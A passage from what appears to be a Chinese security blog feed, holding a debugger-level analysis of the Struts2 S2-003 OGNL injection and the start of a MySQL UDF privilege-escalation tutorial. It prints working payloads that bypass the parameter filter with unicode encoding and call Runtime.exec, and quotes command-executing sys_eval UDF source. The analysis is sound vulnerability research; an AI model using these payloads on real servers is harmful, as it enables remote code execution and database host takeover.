class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.jsp如下:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">17974</span></span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">1</span>/<span class="number">23</span></span><br><span class="line">  Time: <span class="number">14</span>:<span class="number">57</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-003&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-003 Demo&lt;/h2&gt;</span><br><span class="line">Success!</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0X02-S2-003"><a href="#0X02-S2-003" class="headerlink" title="0X02:S2-003"></a>0X02:S2-003</h1><p><strong>触发点</strong>:</p><p>每个人对于漏洞的触发点理解不同,我认为触发点是开始执行恶意代码地方,也就是OgnlUtil.getValue或者OgnlUtil.setValue,与S2-001一样,只是我们通过不同的方法/路径,找到了控制参数的办法,最终的结果都是控制了OgnlUtil.getValue或这OgnlUtil.setValue的expr参数</p><p>按照我的理解整个S2-003的触发点位于调用了位于com.opensymphony.xwork2.util.OgnlValueStack.setValue方法中的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlUtil.setValue(expr, context, root, value);</span><br></pre></td></tr></table></figure><p>由于这个地方的expr可控,并且payload中使用unicode编码绕过了拦截器对特殊字符的拦截</p><p>让我们来看看这个expr参数是从何而来的</p><p>断点来到com.opensymphony.xwork2.interceptor.ParamatersInterceptor.doIntercept方法中代码段</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124001680.png" class title="image-20220126124001680"><p>155行处设置了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlContextState.setDenyMethodExecution(contextMap, true);</span><br></pre></td></tr></table></figure><p>Deny Method Execution顾名思义,拒绝方法执行,此处将这个值设置为true,也就是说我们等等需要修改这个地方为false才能允许我们方法执行从而执行静态方法</p><p>我们进入159行setParameters</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124335412.png" class title="image-20220126124335412"><p>来到setParameters方法里面看到186行,acceptableName(name)那么便是我们刚刚传进去的参数,这里是对参数进行一个判断,返回的是bool类型的值.</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124543892.png" class title="image-20220126124543892"><p>可以看到简单粗暴的判断了字符串中是否存在=,:#,在高一点的版本中这个地方是采用正则进行过滤的,但是不影响</p><p>由于我们的#采用unicode编码,所以这个地方就饶过了.</p><p>到这个地方就产生了一个疑问:为什么unicode编码可以被ongl表达式解析?后面会进行说明</p><p>绕过了acceptableName,就来到了193行的stack.setValue(name),进入setValue方法,便来到了触发点</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124946931.png" class title="image-20220126124946931">158行调用 OnglUtil.setValue(expr,context,root,value)<p>到这个地方expr还是我们可控的,就是我们的参数,并且unicode编码没有被解析,那我们可以肯定unicode编码的解析是ognl完成的而不是struct,而到这个地方,整个漏洞对于Struct的解析已经完成了,因为执行这个ognl表达式全部都是ognl的事情,和struct没有关系.<strong>到这,我们就应该停一下.把对struct的分析转换到对Ognl表达式的分析来也是本篇文章的重点</strong></p><h1 id="0x03-OnglUtil-setValue-expr-context-root-value"><a href="#0x03-OnglUtil-setValue-expr-context-root-value" class="headerlink" title="0x03:OnglUtil.setValue(expr,context,root,value)"></a>0x03:OnglUtil.setValue(expr,context,root,value)</h1><p><strong>现在我们的目的就是找出一个expr,可以执行代码,可以修改上下文</strong></p><p>tpis:上下文(context)</p><p>何为上下文?可以理解为一个临时环境变量,context是一个大的hashmap,需要用到的变量,值可以从里面取出</p><p>为什么叫上下文?举个例子,一篇小说,直接给你看一句话说主角死了,没有文章的上下文你就不知道前因后果,主角为什么死了?程序也是一样的,单独的一行代码而没有上下文你就不知道为什么要执行这行代码,这行代码的意义是配合之前的代码呢还是为下面即将运行的代码做准备,所以取了这么个名字.而在本次文章中,经常见到的context就是此次程序运行的上下文.</p><p>从struct中脱离出来,搭建本地环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.CompoundRoot;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.OgnlUtil;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">        OgnlContext context = new OgnlContext();#创建上下文</span><br><span class="line">        CompoundRoot root = new CompoundRoot();#创建root对象</span><br><span class="line">        context.put(&quot;flag&quot;,true);#往context中放入变量flag,值为true</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            OgnlUtil.setValue(<span class="string">&quot;(&#x27;#context[\\&#x27;flag\\&#x27;]=false&#x27;)(&#x27;bla&#x27;)(&#x27;bla&#x27;)&quot;</span>,context,root,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(context.get(&quot;flag&quot;));#从context获取值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126133954776.png" class title="image-20220126133954776"><p>可以看到成功修改了flag的值为false,但是同时也报错了,why?</p><p>接下来将深入对ognl表达式解析过程进行分析</p><p>跟进OgnlUtil.setValue</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126134332559.png" class title="image-20220126134332559"><p>看到compile(name),compile的作用是生成一颗AST树,跟进</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126140329340.png" class title="image-20220126140329340"><p>可以看到它调用了Ognl.parseExpression()去生成ASTchain,类型是ASTEval类型,可以看到,经过compline的转换后,原始的(one)(two)(three)被解析成了((one)(two))(three),因为只有这样才能满足下面的转换分配节点.</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141023578.png" class title="image-20220126141023578"><p>这个树长这样</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141635081.png" class title="image-20220126141635081"><p>带着这样一个AST树进入Ognl.setValue</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141745774.png" class title="image-20220126141745774"><p>将我们的ASTEval转换为Node类型,调用它的setValue(),继续跟进</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141910573.png" class title="image-20220126141910573"><p>紧接着调用evaluateSetValueBody</p><p>跟进:</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141938967.png" class title="image-20220126141938967"><p>此时this为((“#context[&#39;flag&#39;]=false”)(“bla”))(“bla”)也就是根节点</p><p>跟进141行调用根节点的setValueBody</p><p><strong>注意,此时是进入了setValue的第35行,等等我们会回到这里(第一次注意)</strong></p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142046434.png" class title="image-20220126142046434"><p>此时调用childern[0]的getValue方法,childern[0]的值为(“#context[&#39;flag&#39;]=false”)(“bla”)</p><p>跟进,调用childern[0]的evaluateGetValueBody方法,注意,此时的evaluateGetValueBody方法是SimpleNode类中的,和上一步的evaluateGetValueBody不一样,因为此时childern[0]是一个node</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142514861.png" class title="image-20220126142514861"><p>此时的this,也就是chrildern[0]是(“#context[&#39;flag&#39;]=false”)(“bla”),它仍然是一个ASTevalchain,还可以被继续解析,所以在第130行判断是否为常量的时候直接返回false,继续调用(ASTEval)this.getValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142712711.png" class title="image-20220126142712711"><p>此时我们又进入了和刚刚一样的代码段,是因为我们在递归解析这个AST树,直到解析到没有AST树结构存在时才会停止,此时的childern[0]</p><p>是”#context[&#39;flag&#39;]=false”此时他已经是一个ASTConst了,调用getValue接着和上面一样调用evaluateGetValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/L02JOLIVBP%60V0_ZS5K%7D6%7BDR.png" class title="img"><p>可以看到此时已经是ASTConst类型的数据了,进入if后将this.constantValue为true,131行进入的是ASTConst的getValueBody,里面直接返回了true,然后直接135行return</p><p>解析完毕左节点childern[0]后来到了之前的位置</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143709106.png" class title="image-20220126143709106"><p>此时解析childer[1],childern[1]的值是bla,也就是个字符串</p><p>和刚刚一样的调用栈,跟进getvalue,然后跟进evaluateGetValueBody,childern[1]是ASTConst类型的,直接return</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143905160.png" class title="image-20220126143905160"><p>回来了,此时source为”bla”</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143956352.png" class title="image-20220126143956352"><p>往下来到result = node.getValue(context,source)</p><p>此时node为#context[“flag”] = false,source为”bla”,node的类型为ASTAssign</p><p>调用node的getValue,然后调用evaluateGetValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126144641526.png" class title="image-20220126144641526"><p>又来到这个熟悉的地方,不过此时this是ASTAssign,所以进入ASTAssing的getValueBody方法</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126144737881.png" class title="image-20220126144737881"><p>可以看到此时children[0]是ASTChain,children[1]是ASTConst</p><p>此时result的值为false,调用children[0].setvalue,跟以前一样最终会调用ASTChain类型的setValueBody</p><p><strong>注意(第二次注意)</strong>:此时result的值是childern[1]的值,也就是我们payload中=右边的那个值,在这里被拆成ASTConst了,这个result是要返回的,返回到setValue的第35行,也就是我第一次说注意的那个地方的setvalue,这与为什么执行成功但是却报错了有直接关系</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145209254.png" class title="image-20220126145209254"><p>在ASTChain类型的setValueBody中调用ASTProperty的一个setValue,最终会调用到</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145351591.png" class title="image-20220126145351591"><p>进入setProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145455320.png" class title="image-20220126145455320"><p>继续跟进accessor.setProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145536323.png" class title="image-20220126145536323"><p>此时map就是我们的context,name就是flag,value是false</p><p>至此,就完成了对context中flag字段的值的修改</p><p>还没有结束,现在我们完成了对第一层childern[0]的解析,还有第一层childern[1]的解析</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141635081.png" class title="image-20220126141635081"><p><strong>注意,此时是离开了setValue的第35行(第三次注意)</strong></p><p>此时我们回来到了第一次进入的setValue方法,刚刚所有的都是在第35行里面进行的,现在执行完了第三十五行,回到这开始继续往下执行</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145940830.png" class title="image-20220126145940830"><p>此时的expr为刚刚返回的result,第二次注意已经说了所以此时expr的值等于payload中等号右边的值等于false</p><p>38行expr被转换为Node,但他并不是一个合法的ongl表达式,所以在第42行尝试调用node.setValue方法进行解析的时候直接就报错了并且报错信息为”321”不是一个正确的OGNL表达式</p><p>Exception in thread “main” ognl.InappropriateExpressionException: Inappropriate OGNL expression: 321</p><p>至此,整个调用过程就讲解完毕了</p><h1 id="0X04-回到Struts2"><a href="#0X04-回到Struts2" class="headerlink" title="0X04:回到Struts2"></a>0X04:回到Struts2</h1><p>1.为什么unicode编码能绕过?</p><p>因为在生成AST树的时候compile中使用了JavaCharStream来读取数据流,我发现了这样一段代码</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126152130767.png" class title="image-20220126152130767"><p>当读取到\u时会继续读取四个字符,并将它们转换为char,这就解释了为什么unicode可以被解析成功了</p><p>2.编写payload</p><p>0X01中说了,刚开始的时候会将OgnlContextState.setDenyMethodExecution(contextMap, true);设为True,禁止我们执行方法,那首先就需要将他改成false</p><p>利用payload修改上下文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>第二个参数执行静态方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>细心的同学可能发现了,这里payload后面两个括号时不带有’’的,是(mengda)而不是(‘mengda’)</p><p>因为不带引号在单独测试的环境中会报错,原因是在通过ASTProperty的getValueBody方法时,accessor类型为</p><p>ListPropertyAccessor导致的,原因不明,所以加不加引号对struct的复现没有影响,只是不加引号本地单独复现会报错</p><p>大概给大家看一下原因,这是ASTProperty的getValueBody方法</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153450622.png" class title="image-20220126153450622"><p>跟进getProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153522745.png" class title="image-20220126153522745"><p>跟进getPropertyAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153548744.png" class title="image-20220126153548744"><p>可以发现此时的answer已经变成了ListPropertyAccessor</p><p>而加上引号的话此处就会变成MapPropertyAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153702432.png" class title="image-20220126153702432"><p>在struct环境中无论加不加引号此处的值都为CompoundRootAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126154030687.png" class title="image-20220126154030687">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;S2-003是第我审计的第二个java漏洞,其中核心还是围绕着OGNL表达式注入的利用,在我的”Struts2-S001”中以一种初学者</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Struts2" scheme="https://men9da.cn/tags/Struts2/"/>
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>UDF提权</title>
    <link href="https://men9da.cn/2022/01/14/UDF%E6%8F%90%E6%9D%83/"/>
    <id>https://men9da.cn/2022/01/14/UDF%E6%8F%90%E6%9D%83/</id>
    <published>2022-01-14T08:32:56.000Z</published>
    <updated>2022-01-27T11:09:12.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UDF（user-defined-function"><a href="#UDF（user-defined-function" class="headerlink" title="UDF（user defined function)"></a>UDF（user defined function)</h1><p>mysql自带的函数有user(),version()等,除了自带的函数,用户可以自定义一些函数方便在查询的时候使用它们,我们把这些函数称之为UDF(user defined function)</p><p>用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function function_name returns &#123;string|integer|real|decimal&#125; routine_body</span><br></pre></td></tr></table></figure><p>function_name:函数名</p><p>routine_body:由合法的sql语句构成的函数体</p><p>举个例子:</p><p> 查询user表id为1的username我们应该这么写:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from user where id &#x3D; 1;</span><br></pre></td></tr></table></figure><p>执行结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| mengda   |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>这个时候我们自定义一个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function getUserName(userid int) returns varchar(30) return (select username from user where id &#x3D; userid);</span><br></pre></td></tr></table></figure><p>然后执行这个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select getUserName(1);</span><br></pre></td></tr></table></figure><p>执行结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+</span><br><span class="line">| getUserName(1) |</span><br><span class="line">+----------------+</span><br><span class="line">| mengda         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><h1 id="create-function中的SONAME关键字"><a href="#create-function中的SONAME关键字" class="headerlink" title="create function中的SONAME关键字"></a>create function中的SONAME关键字</h1><p> 我们来看这一行sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function udf_add returns int SONAME &quot;udf_add.so&quot;;</span><br></pre></td></tr></table></figure><p><code>so</code>文件命名规则被称为SONAME,在这个地方,我们的udf_add函数需要从udf_add.so文件中去加载,查看加载so文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br><span class="line">+-------------------------------+------------------------+</span><br><span class="line">| Variable_name                 | Value                  |</span><br><span class="line">+-------------------------------+------------------------+</span><br><span class="line">| default_authentication_plugin | mysql_native_password  |</span><br><span class="line">| plugin_dir                    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+-------------------------------+------------------------+</span><br></pre></td></tr></table></figure><p>可以看到mysql会去加载/usr/lib/mysql/plugin/下的so文件</p><p>我自己尝试写了一下这个udf_add.so</p><p>udf_add.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt; </span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udf_add</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = *((<span class="keyword">int</span> *)args-&gt;args[<span class="number">0</span>]);  </span><br><span class="line">    <span class="keyword">int</span> b = *((<span class="keyword">int</span> *)args-&gt;args[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">return</span> a + b;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">udf_add_init</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里我定义了一个udf_add函数,传入函数的是一个UDF_ARGS数组,取前两位相加获得结果</p><p>创建.so文件,并将其移动到对应的so文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc udf_add.cpp -fPIC -shared -o udf_add.so</span><br></pre></td></tr></table></figure><p>创建自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function udf_add returns int SONAME &quot;udf_add.so&quot;;</span><br></pre></td></tr></table></figure><p>查看当前自定义函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br><span class="line">+---------+-----+------------+----------+</span><br><span class="line">| name    | ret | dl         | type     |</span><br><span class="line">+---------+-----+------------+----------+</span><br><span class="line">| udf_add |   2 | udf_add.so | function |</span><br><span class="line">+---------+-----+------------+----------+</span><br></pre></td></tr></table></figure><p>执行自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select udf_add(3,4);</span><br></pre></td></tr></table></figure><p>结果:可以看到已经完成了计算返回了7,至此我们成功调用了第三方库当中的函数.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">| udf_add(3,4) |</span><br><span class="line">+--------------+</span><br><span class="line">|            7 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p>自己写这样一个udf_app.so是为了更好的理解这个加载的过程,互联网上已经有现成的.so文件,其中实现了许多的函数,其中就包括可以命令执行的sys_eval()函数,如下:</p><p>完整源码来源:<a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.c">https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.c</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">sys_eval</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">UDF_INIT *initid</span></span></span><br><span class="line"><span class="function"><span class="params">,UDF_ARGS *args</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">char</span>* result</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">unsigned</span> <span class="keyword">long</span>* length</span></span></span><br><span class="line"><span class="function"><span class="params">,<span 